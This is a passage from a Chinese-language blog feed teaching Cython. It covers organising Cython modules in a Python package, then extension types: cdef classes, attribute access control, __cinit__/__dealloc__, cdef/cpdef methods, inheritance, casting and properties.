class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">IF UNAME_SYSNAME == &quot;Linux&quot;:</div><div class="line">    include &quot;linux.pxi&quot;</div><div class="line">ELIF UNAME_SYSNAME == &quot;Darwin&quot;:</div><div class="line">    include &quot;darwin.pxi&quot;</div><div class="line">ELIF UNAME_SYSNAME == &quot;Windows&quot;:</div><div class="line">    include &quot;windows.pxi&quot;</div></pre></td></tr></table></figure></p><p>注意：同一个源文件include两次，可能会因为重复定义导致编译错误，所以要小心正确的使用include。<br>一些老的代码使用include，新的代码建议使用cimport语句和定义文件，除非是源码级别的包含。<br>使用定义文件，包含文件和实现文件，我们可以使Cython适配任何C或者Python代码。</p><h2 id="在Python包中组织和编译Cython模块"><a href="#在Python包中组织和编译Cython模块" class="headerlink" title="在Python包中组织和编译Cython模块"></a>在Python包中组织和编译Cython模块</h2><p>Cython一个显著的特点是允许我们根据性能和分析结果逐步将Python代码转化为Cython代码，从而保持外部接口不变，但是性能得到显著提升。<br>假设我们有下列包结构的项目：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">pysimulator</div><div class="line">├── __init__.py</div><div class="line">├── main.py</div><div class="line">├── core</div><div class="line">│ ├── __init__.py</div><div class="line">│ ├── core.py</div><div class="line">│ └── sim_state.py</div><div class="line">├── plugins</div><div class="line">│ ├── __init__.py</div><div class="line">│ ├── plugin0.py</div><div class="line">│ └── plugin1.py</div><div class="line">└── utils</div><div class="line">  ├── __init__.py</div><div class="line">  ├── config.py</div><div class="line">  └── output.py</div></pre></td></tr></table></figure></p><p>本实例的重点不是实现细节，而是Cython和Python如何在一个框架中共同工作。<br>假设我们分析发现core.py、sim_state.py和plugin0.py需要转换成Cython扩展模块来提升性能，其他的模块还是纯Python保持灵活性。<br>第一步是将.py模块转换到实现文件.pyx并且将其中公共的Cython声明提取到定义文件.pxd中。因为文件分布在不同的包和子包中，我们必须要使用适当的名称来进行导入。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#sim_state.pxd</span></div><div class="line">ctypedef double real_t</div><div class="line"></div><div class="line">cdef <span class="class"><span class="keyword">class</span> <span class="title">State</span>:</span></div><div class="line">    cdef:</div><div class="line">        unsigned int n_particles</div><div class="line">        real_t *x</div><div class="line">        real_t *vx</div><div class="line"></div><div class="line">    cpdef real_t momentum(self)</div><div class="line"></div><div class="line"><span class="comment">#core.pxd</span></div><div class="line"><span class="keyword">from</span> simulator.core.sim_state cimport State, real_t</div><div class="line"></div><div class="line">cpdef int run(State, list plugins=<span class="keyword">None</span>)</div><div class="line">cpdef step(State st, real_t dt)</div><div class="line"></div><div class="line"><span class="comment">#plugin0.pxd</span></div><div class="line"><span class="keyword">from</span> simulator.core.sim_state cimport State</div><div class="line"></div><div class="line">cpdef run(State st)</div><div class="line"></div><div class="line"><span class="comment">#main.py</span></div><div class="line"><span class="keyword">from</span> simulator.utils.config <span class="keyword">import</span> setup_params</div><div class="line"><span class="keyword">from</span> simulator.utils.output <span class="keyword">import</span> output_state</div><div class="line"><span class="keyword">from</span> simulator.core.sim_state <span class="keyword">import</span> State</div><div class="line"><span class="keyword">from</span> simulator.core.core <span class="keyword">import</span> run</div><div class="line"><span class="keyword">from</span> simulator.plugins <span class="keyword">import</span> plugin0</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(fname)</span>:</span></div><div class="line">    params = setup_params(fname)</div><div class="line">    state = State(params)</div><div class="line">    output_state(state)</div><div class="line">    run(state, plugins=[plugin0.run])</div><div class="line">    output_state(state)</div></pre></td></tr></table></figure></p><p>经过我们的转换后，main.py还是保持原来的纯Python代码没有变。<br>为了便于运行转换后的项目，我们可以使用pyximport或者将项目构建成一个包，如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#setup.py</span></div><div class="line"><span class="keyword">from</span> distutils.core <span class="keyword">import</span> setup</div><div class="line"><span class="keyword">from</span> Cython.Build <span class="keyword">import</span> cythonize</div><div class="line"></div><div class="line">setup(name=<span class="string">"simulator"</span>,</div><div class="line">      packages=[<span class="string">"simulator"</span>, <span class="string">"simulator.core"</span>, <span class="string">"simulator.utils"</span>, <span class="string">"simulator.plugins"</span>],</div><div class="line">      ext_modules=cythonize(<span class="string">"**/*.pyx"</span>),</div><div class="line">)</div></pre></td></tr></table></figure></p><p>使用cythonize和distutils进行打包非常强大和灵活，当.pyx改变时他会自动检测并根据需要重新编译，它还会检测实现文件和定义文件之间的相互依存关系并重新编译所有相关的实现文件。</p></the></excerpt>]]></content>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Cython </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>第五章 Cython和扩展类型</title>
      <link href="/2017/08/10/%E7%AC%AC%E4%BA%94%E7%AB%A0-Cython%E5%92%8C%E6%89%A9%E5%B1%95%E7%B1%BB%E5%9E%8B/"/>
      <url>/2017/08/10/%E7%AC%AC%E4%BA%94%E7%AB%A0-Cython%E5%92%8C%E6%89%A9%E5%B1%95%E7%B1%BB%E5%9E%8B/</url>
      <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要=""><p>前面几章介绍了Cython如何和Python一起工作，侧重于基础数据类型和函数，Cython也能在Python类上面做一样好，本章我们将继续学习。</p><a id="more"></a><the rest="" of="" contents="" |="" 余下全文=""><h2 id="比较Python类和扩展类型"><a href="#比较Python类和扩展类型" class="headerlink" title="比较Python类和扩展类型"></a>比较Python类和扩展类型</h2><p>Python中一切皆为对象，对象有三个基本元素：id、value和type。对象的类型指定了该对象的行为，他们的行为通过特殊的方法控制。Python允许我们创建新的类型，也就是类，通过class关键字定义，本章我们将看到Cython如何允许底层的C访问对象的数据和方法，和他带来的好处。<br>我们可以使用Python/C API来用C语言直接创建扩展类型，效率会显著提升，但是要熟悉Python/C API，编写难度大，这个时候就有了Cython的用武之地了：Cython创建和使用扩展类型和纯Python的一样简单，Cython使用cdef class代码块，和纯Python类有很多相同的地方。</p><h2 id="Cython中的扩展类型"><a href="#Cython中的扩展类型" class="headerlink" title="Cython中的扩展类型"></a>Cython中的扩展类型</h2><p>举个例子，有下面一个类：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Particle</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="string">"""Simple Particle type."""</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, m, p, v)</span>:</span></div><div class="line">        self.mass = m</div><div class="line">        self.position = p</div><div class="line">        self.velocity = v</div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_momentum</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> self.mass * self.velocity</div></pre></td></tr></table></figure></p><p>上面是一个纯Python类，我们可以使用Cython编译这个类为C语言，生成的代码使用了Python/C API，和纯Python编写基本上没区别，因为绕过了解释器，所以性能可能得到一点点提升，但是没有从静态类型中得到任何好处。<br>将上面的类转化为Cython的扩展类型如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">cdef <span class="class"><span class="keyword">class</span> <span class="title">Particle</span>:</span></div><div class="line">    <span class="string">"""Simple Particle extension type."""</span></div><div class="line">    cdef double mass, position, velocity</div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, m, p, v)</span>:</span></div><div class="line">        self.mass = m</div><div class="line">        self.position = p</div><div class="line">        self.velocity = v</div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_momentum</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> self.mass * self.velocity</div></pre></td></tr></table></figure></p><p>cdef class声明告诉Cython生成一个扩展类型而不是一个Python类，C级别的实例属性和C++或者Java类似，所以所有的属性必须定义，否则初始化调用<strong>init</strong>()函数会抛出属性未定义异常。<br>编译使用我们的例子：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">In [<span class="number">1</span>]: <span class="keyword">import</span> pyximport; pyximport.install()</div><div class="line">Out[<span class="number">1</span>]: (<span class="keyword">None</span>, &lt;pyximport.pyximport.PyxImporter at <span class="number">0x101c64290</span>&gt;)</div><div class="line">In [<span class="number">2</span>]: <span class="keyword">import</span> cython_particle</div><div class="line">In [<span class="number">3</span>]: <span class="keyword">import</span> python_particle</div><div class="line">In [<span class="number">6</span>]: py_particle = python_particle.Particle(<span class="number">1.0</span>, <span class="number">2.0</span>, <span class="number">3.0</span>)</div><div class="line">In [<span class="number">7</span>]: cy_particle = cython_particle.Particle(<span class="number">1.0</span>, <span class="number">2.0</span>, <span class="number">3.0</span>)</div><div class="line">In [<span class="number">8</span>]: py_particle.get_momentum()</div><div class="line">Out[<span class="number">8</span>]: <span class="number">3.0</span></div><div class="line">In [<span class="number">9</span>]: cy_particle.get_momentum()</div><div class="line">Out[<span class="number">9</span>]: <span class="number">3.0</span></div><div class="line">In [<span class="number">10</span>]: py_particle.mass, py_particle.position, py_particle.velocity</div><div class="line">Out[<span class="number">10</span>]: (<span class="number">1.0</span>, <span class="number">2.0</span>, <span class="number">3.0</span>)</div><div class="line">In [<span class="number">11</span>]: cy_particle.mass, cy_particle.position, cy_particle.velocity</div><div class="line">Traceback (most recent call last)</div><div class="line">[...]</div><div class="line">AttributeError: <span class="string">'cython_particle.Particle'</span> object has no attribute <span class="string">'mass'</span></div><div class="line">In [<span class="number">13</span>]: py_particle.charge = <span class="number">12.0</span></div><div class="line">In [<span class="number">14</span>]: cy_particle.charge = <span class="number">12.0</span></div><div class="line">Traceback (most recent call last)</div><div class="line">[...]</div><div class="line">AttributeError: <span class="string">'cython_particle.Particle'</span> object has no attribute <span class="string">'charge'</span></div></pre></td></tr></table></figure></p><p>从上述例子中我们发现，为什么扩展类型中的实例属性不能从Python中访问？为什么我们不能给扩展类型添加新的属性？因为Cython定义的扩展属性编译的时候实际上是一个C语言结构体，编译的时候已经固定了大小，不能添加和更改新的属性。</p><h2 id="类型属性和访问控制"><a href="#类型属性和访问控制" class="headerlink" title="类型属性和访问控制"></a>类型属性和访问控制</h2><p>纯Python类访问属性是通过在<strong>dict</strong>字典中查找，可以任意访问、添加、修改属性，但是性能不高，Cython通过cdef class定义的扩展类型，直接将代码编译为C语言的结构体，性能能得到显著提升，默认情况下扩展类型属性是私有的，但是如何访问Cython的扩展类型的属性了？可以明确的通过Cython设置属性的只读、可写和可读。<br>下面是可读实例：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#mass, position, velocity三个属性均只读</span></div><div class="line">cdef <span class="class"><span class="keyword">class</span> <span class="title">Particle</span>:</span></div><div class="line">    <span class="string">"""Simple Particle extension type."""</span></div><div class="line">    cdef readonly double mass, position, velocity</div><div class="line">    <span class="comment">#...</span></div><div class="line"></div><div class="line"><span class="comment">#mass可读，position和velocity对Python不可读</span></div><div class="line">cdef <span class="class"><span class="keyword">class</span> <span class="title">Particle</span>:</span></div><div class="line">    <span class="string">"""Simple Particle extension type."""</span></div><div class="line">    cdef readonly double mass</div><div class="line">    cdef double position, velocity</div><div class="line">    <span class="comment"># ...</span></div><div class="line"></div><div class="line"><span class="comment">#mass属性可读写，position属性只读，velocity属性不可读</span></div><div class="line">cdef <span class="class"><span class="keyword">class</span> <span class="title">Particle</span>:</span></div><div class="line">    <span class="string">"""Simple Particle extension type."""</span></div><div class="line">    cdef public double mass</div><div class="line">    cdef readonly double position</div><div class="line">    cdef double velocity</div><div class="line">    <span class="comment"># ...</span></div></pre></td></tr></table></figure></p><h2 id="C层面的初始化和终止"><a href="#C层面的初始化和终止" class="headerlink" title="C层面的初始化和终止"></a>C层面的初始化和终止</h2><p>和Python类的初始化不一样，C层面的扩展类型是本质上是结构体，在调用<strong>init</strong>之前，实例的结构必须分配，所有的字段必须是有效状态，等待初始值。Cython添加了一个特殊的方法<strong>cinit</strong>，其职责是C级别的分配和初始化。在上面的例子中，Particle是可以使用<strong>init</strong>进行初始化的，因为属性都是double类型，但是这取决于扩展类型被继承或者有其他的构造函数，<strong>init</strong>在创建对象中会被调用多次，但是有方法绕过<strong>init</strong>函数，Cython可以确保<strong>cinit</strong>只被调用一次，而且在<strong>init</strong>、<strong>new</strong>或者其他函数之前被调用，Cython通过<strong>cinit</strong>初始化任何参数。如下面例子：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> libc.stdlib cimport *</div><div class="line"></div><div class="line">cdef <span class="class"><span class="keyword">class</span> <span class="title">Matrix</span>:</span></div><div class="line">    cdef:</div><div class="line">        unsigned int nrows, ncols</div><div class="line">        double *_matrix</div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__cinit__</span><span class="params">(self, nr, nc)</span>:</span></div><div class="line">        self.nrows = nr</div><div class="line">        self.ncols = nc</div><div class="line">        self._matrix = &lt;double*&gt;malloc(nr * nc * sizeof(double))</div><div class="line">        <span class="keyword">if</span> self._matrix == NULL:</div><div class="line">            <span class="keyword">raise</span> MemoryError()</div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__dealloc__</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">if</span> self._matrix != NULL:</div><div class="line">            free(self._matrix)</div></pre></td></tr></table></figure></p><p>上面的例子中如果self._matrix放在<strong>init</strong>中初始化，那个<strong>init</strong>永远不会被调用，使用self._matrix就会失败，如果<strong>init</strong>调用多次，会造成内存泄露。<br>Cython通过<strong>dealloc</strong>特殊函数进行清理，释放资源，Cython确保在终止时只调用一次<strong>dealloc</strong>函数来释放<strong>cinit</strong>创建时申请的资源。</p><h2 id="cdef和cpdef方法"><a href="#cdef和cpdef方法" class="headerlink" title="cdef和cpdef方法"></a>cdef和cpdef方法</h2><p>在cdef class中我们也可以使用cdef和cpdef方法，但是在普通的Python类中使用会报错。<br>cdef方法和cdef函数类似：所有的参数都是传进去的，所以没有Python到C的类型映射，这也意味着cdef方法只能被Cython代码调用，不能被Python代码调用。<br>cpdef方法和cpdef函数类似：cpdef可以被扩展的Python代码和其他的Cython代码调用，当然，参数值和返回值必须自动的转换为Python对象，所以限制了允许的数据类型，如指针就不行。<br>如下面例子：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">cdef <span class="class"><span class="keyword">class</span> <span class="title">Particle</span>:</span></div><div class="line">    <span class="string">"""Simple Particle extension type."""</span></div><div class="line">    cdef double mass, position, velocity</div><div class="line">    <span class="comment"># ...</span></div><div class="line">    cpdef double get_momentum(self):</div><div class="line">        <span class="keyword">return</span> self.mass * self.velocity</div><div class="line"></div><div class="line"><span class="comment">#我们可以在Python shell或者Python代码中或者Cython代码中运行下面例子</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_momentums</span><span class="params">(particles)</span>:</span></div><div class="line">    <span class="string">"""Returns the sum of the particle momentums."""</span></div><div class="line">    total_mom = <span class="number">0.0</span></div><div class="line">    <span class="keyword">for</span> particle <span class="keyword">in</span> particles:</div><div class="line">        total_mom += particle.get_momentum()</div><div class="line">    <span class="keyword">return</span> total_mom</div></pre></td></tr></table></figure></p><p>上面的例子可以看做是Python代码对扩展类的包装，Particle底层的结构和Python对象之间的封装和解包都是自动完成的。我们也可以添加类型信息，这样Cython代码将会生成更快的代码，如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_momentums_typed</span><span class="params">(list particles)</span>:</span></div><div class="line">    <span class="string">"""Returns the sum of the particle momentums."""</span></div><div class="line">    cdef:</div><div class="line">        double total_mom = <span class="number">0.0</span></div><div class="line">        Particle particle</div><div class="line">    <span class="keyword">for</span> particle <span class="keyword">in</span> particles:</div><div class="line">        total_mom += particle.get_momentum()</div><div class="line">    <span class="keyword">return</span> total_mom</div></pre></td></tr></table></figure></p><p>上面例子中，如果我们调用particle时不声明类型，性能甚至比纯Python代码还要差。<br>还有一个例子需要比较，如果我们将get_momentum()换成cdef函数其他的不变会怎样？<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">cdef <span class="class"><span class="keyword">class</span> <span class="title">Particle</span>:</span></div><div class="line">    <span class="string">"""Simple Particle extension type."""</span></div><div class="line">    cdef double mass, position, velocity</div><div class="line">    <span class="comment"># ...</span></div><div class="line">    cpdef double get_momentum(self):</div><div class="line">        <span class="keyword">return</span> self.mass * self.velocity</div><div class="line">    cdef double get_momentum_c(self):</div><div class="line">        <span class="keyword">return</span> self.mass * self.velocity</div></pre></td></tr></table></figure></p><p>这个版本性能是最好的，但是get_momentum_c()方法不能被Python调用，只能被Cython调用。</p><h2 id="继承和子类"><a href="#继承和子类" class="headerlink" title="继承和子类"></a>继承和子类</h2><p>一个扩展类型可以继承一个基类，但是这个基类必须是用C实现或者内置类型或者其他的扩展类型，常规的Python类或者扩展类型尝试多继承都会报错。<br>例子如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">cdef <span class="class"><span class="keyword">class</span> <span class="title">CParticle</span><span class="params">(Particle)</span>:</span></div><div class="line">    cdef double momentum</div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, m, p, v)</span>:</span></div><div class="line">        super(CParticle, self).__init__(m, p, v)</div><div class="line">        self.momentum = self.mass * self.velocity</div><div class="line">    cpdef double get_momentum(self):</div><div class="line">        <span class="keyword">return</span> self.momentum</div></pre></td></tr></table></figure></p><p>当然也可以在纯Python中继承Particle类，如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">PyParticle</span><span class="params">(Particle)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, m, p, v)</span>:</span></div><div class="line">        super(PyParticle, self).__init__(m, p, v)</div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_momentum</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> super(PyParticle, self).get_momentum()</div></pre></td></tr></table></figure></p><p>但是PyParticle不能访问Particle中私有的C级别的属性和cdef方法，只能重写def和cpdef方法。不过这样做很慢，穿越Cython/Python边界需要一定的开销。</p><h2 id="铸造和子类"><a href="#铸造和子类" class="headerlink" title="铸造和子类"></a>铸造和子类</h2><p>当时用动态类型时，Cython不能访问C级别的数据和方法，所有的属性访问都必须通过Python/C API，这样很慢，但是Cython可以通过定义静态类型或者使用cpdef方法来访问属性而不用通过Python/C API。我们还可以将动态类型赋值给静态类型，如下：<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">cdef Particle static_p = p</div><div class="line">print(static_p.get_momentum())</div><div class="line">print(static_p.velocity)</div><div class="line"><span class="comment">#或者这样使用</span></div><div class="line">print( (&lt;Particle&gt;p).get_momentum())</div><div class="line">print( (&lt;Particle&gt;p).velocity)</div><div class="line"><span class="comment">#下面的方法更加安全</span></div><div class="line">print( (&lt;Particle?&gt;p).get_momentum())</div><div class="line">print( (&lt;Particle?&gt;p).velocity)</div></pre></td></tr></table></figure></p><p>如果p不是Particle实例或者他的子类会抛出TypeError异常。</p><h2 id="扩展类型对象和None"><a href="#扩展类型对象和None" class="headerlink" title="扩展类型对象和None"></a>扩展类型对象和None</h2><p>有下面一个简单的函数：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dispatch</span><span class="params">(Particle p)</span>:</span></div><div class="line">    <span class="keyword">print</span> p.get_momentum()</div><div class="line">    <span class="keyword">print</span> p.velocity</div><div class="line"></div><div class="line"><span class="comment">#有下面几种使用方式</span></div><div class="line">dispatch(Particle(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)) <span class="comment"># OK</span></div><div class="line">dispatch(CParticle(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)) <span class="comment"># OK</span></div><div class="line">dispatch(PyParticle(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)) <span class="comment"># OK</span></div><div class="line">dispatch(object()) <span class="comment"># TypeError</span></div><div class="line">dispatch(<span class="keyword">None</span>) <span class="comment"># Segmentation fault!</span></div></pre></td></tr></table></figure></p><p>Python的None相当于C语言的null，但是本质上None没有C接口，所以尝试用None来访问属性或者方法是无效的，所以dispatch应该先检查p对象是否是None，如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dispatch</span><span class="params">(Particle p)</span>:</span></div><div class="line">    <span class="keyword">if</span> p <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">        <span class="keyword">raise</span> TypeError(<span class="string">"..."</span>)</div><div class="line">    <span class="keyword">print</span> p.get_momentum()</div><div class="line">    <span class="keyword">print</span> p.velocity</div><div class="line"></div><div class="line"><span class="comment">#这是一个常见的操作，Cython提供了特殊的语法</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dispatch</span><span class="params">(Particle p not None)</span>:</span></div><div class="line">    <span class="keyword">print</span> p.get_momentum()</div><div class="line">    <span class="keyword">print</span> p.velocity</div></pre></td></tr></table></figure></p><p>Cython提供了nonecheck编译指令，默认情况下，为了性能，所有函数的的调用都是不安全的，可以通过nonecheck编译指令打开None检查。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#代码开头添加下面指令</span></div><div class="line"><span class="comment"># cython: nonecheck=True</span></div><div class="line"></div><div class="line"><span class="comment">#或者编译的时候指定</span></div><div class="line">$ cython --directive nonecheck=<span class="keyword">True</span> source.pyx</div></pre></td></tr></table></figure></p><h2 id="Cython中的扩展类型属性"><a href="#Cython中的扩展类型属性" class="headerlink" title="Cython中的扩展类型属性"></a>Cython中的扩展类型属性</h2><p>Python的属性访问灵活且功能强大，我们可以在Python类中设置setter和getter方法来方便访问属性，如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Particle</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="comment"># ...</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_get_momentum</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> self.mass * self.velocity</div><div class="line">    momentum = property(_get_momentum)</div></pre></td></tr></table></figure></p><p>Cython针对扩展类型用不同的语法达到了相同的效果：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">cdef <span class="class"><span class="keyword">class</span> <span class="title">Particle</span>:</span></div><div class="line">    <span class="string">"""Simple Particle extension type."""</span></div><div class="line">    cdef double mass, position, velocity</div><div class="line">    <span class="comment"># ...</span></div><div class="line">    property momentum:</div><div class="line">        <span class="string">"""The momentum Particle property."""</span></div><div class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__get__</span><span class="params">(self)</span>:</span></div><div class="line">            <span class="string">"""momentum's getter"""</span></div><div class="line">            <span class="keyword">return</span> self.mass * self.velocity</div><div class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__set__</span><span class="params">(self, m)</span>:</span></div><div class="line">            <span class="string">"""momentum's setter"""</span></div><div class="line">            self.velocity = m / self.mass</div></pre></td></tr></table></figure></p><p>我们可以像访问纯Python一样访问Cython属性，如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">In [<span class="number">3</span>]: p = cython_particle.Particle(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</div><div class="line">In [<span class="number">4</span>]: p.momentum</div><div class="line">Out[<span class="number">4</span>]: <span class="number">3.0</span></div><div class="line">In [<span class="number">5</span>]: p.momentum = <span class="number">4.0</span></div><div class="line">In [<span class="number">6</span>]: p.momentum</div><div class="line">Out[<span class="number">6</span>]: <span class="number">4.0</span></div></pre></td></tr></table></figure></p><p>我们可以在Cython中定义相应的<strong>get</strong>、<strong>set</strong>和<strong>del</strong>特殊方法来访问属性，如果哪一个方法没实现就不能访问相应的操作。</p><h2 id="特殊方法甚至是更加特别"><a href="#特殊方法甚至是更加特别" class="headerlink" title="特殊方法甚至是更加特别"></a>特殊方法甚至是更加特别</h2><p>当Cython扩展类提供支持操作符重载是，我们必须定义一些特殊方法。前面我们已经讲到了<strong>cinit</strong>、<strong>init</strong>、<strong>dealloc</strong>特殊方法，看到了如何处理C级别的初始化，Python级别的初始化和终止。扩展类型不支持<strong>del</strong>特殊方法，<strong>dealloc</strong>替代了他的功能。</p><h3 id="算数方法"><a href="#算数方法" class="headerlink" title="算数方法"></a>算数方法</h3><p>在纯Python中，为了完全重载+操作符号，需要重写<strong>add</strong>和<strong>radd</strong>特殊方法，但是Cython只需要重载<strong>add</strong>就够了，他实现了<strong>add</strong>和<strong>radd</strong>的功能。下面有一个简单的例子：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div 